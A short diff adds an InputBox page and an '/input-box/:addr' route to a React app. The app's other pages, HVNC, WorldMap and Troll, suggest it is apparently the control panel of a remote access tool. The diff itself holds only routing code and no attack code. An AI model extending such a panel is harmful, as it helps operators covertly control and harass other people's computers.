@@ -22,6 +22,7 @@ import {
 import { HVNC } from "./pages/HVNC";
 import { WorldMap } from "./pages/WorldMap";
 import { Troll } from "./pages/Troll";
+import { InputBox } from "./pages/InputBox";
 
 export const App: React.FC = () => {
   return (
@@ -112,6 +113,14 @@ export const App: React.FC = () => {
           element={
             <WindowWrapper feature_cleanup={() => {}}>
               <Troll />
+            </WindowWrapper>
+          }
+        />
+        <Route
+          path="/input-box/:addr"
+          element={
+            <WindowWrapper feature_cleanup={() => {}}>
+              <InputBox />
             </WindowWrapper>
           }
         />
